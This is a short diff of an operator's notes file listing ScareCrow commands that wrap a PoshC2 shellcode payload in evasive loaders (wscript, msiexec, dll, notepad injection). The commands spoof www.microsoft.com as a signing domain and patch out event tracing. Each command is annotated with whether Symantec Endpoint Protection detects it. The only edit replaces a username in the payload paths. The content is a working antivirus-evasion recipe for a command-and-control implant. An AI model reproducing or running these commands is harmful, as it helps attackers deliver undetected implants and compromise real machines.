@@ -1,15 +1,15 @@
 Payload
 Sharp_v4_x64_Shellcode.bin
 ------------------------------------------------------------------------------------------------------------------------------------------------
-sudo ./ScareCrow -I /var/poshc2/cuong/payloads/Sharp_v4_x64_Shellcode.bin -domain www.microsoft.com -etw -console
+sudo ./ScareCrow -I /var/poshc2/x/payloads/Sharp_v4_x64_Shellcode.bin -domain www.microsoft.com -etw -console
 Works without SEP
 SEP detects when turned on
 ------------------------------------------------------------------------------------------------------------------------------------------------
-sudo ./ScareCrow -I /var/poshc2/cuong/payloads/Sharp_v4_x64_Shellcode.bin -Loader wscript -domain www.microsoft.com -O loader.js 
+sudo ./ScareCrow -I /var/poshc2/x/payloads/Sharp_v4_x64_Shellcode.bin -Loader wscript -domain www.microsoft.com -O loader.js 
 Works without SEP
 Sep detects when turned on
 ------------------------------------------------------------------------------------------------------------------------------------------------
-sudo ./ScareCrow -I /var/poshc2/cuong/payloads/Sharp_v4_x64_Shellcode.bin -Loader msiexec -domain www.microsoft.com -O test.js 
+sudo ./ScareCrow -I /var/poshc2/x/payloads/Sharp_v4_x64_Shellcode.bin -Loader msiexec -domain www.microsoft.com -O test.js 
 works without SEP
 Sep detects when turned on
 
@@ -18,7 +18,7 @@ Sep detects when turned on
 
 
 Doesnt work:
-sudo ./ScareCrow -I /var/poshc2/cuong/payloads/Sharp_v4_x64_Shellcode.bin -domain www.microsoft.com -injection "C:\Windows\system32\notepad.exe" -console
+sudo ./ScareCrow -I /var/poshc2/x/payloads/Sharp_v4_x64_Shellcode.bin -domain www.microsoft.com -injection "C:\Windows\system32\notepad.exe" -console
 
-sudo ./ScareCrow -I /var/poshc2/cuong/payloads/Sharp_v4_x64_Shellcode.bin -Loader dll -etw -domain www.microsoft.com
+sudo ./ScareCrow -I /var/poshc2/x/payloads/Sharp_v4_x64_Shellcode.bin -Loader dll -etw -domain www.microsoft.com
 
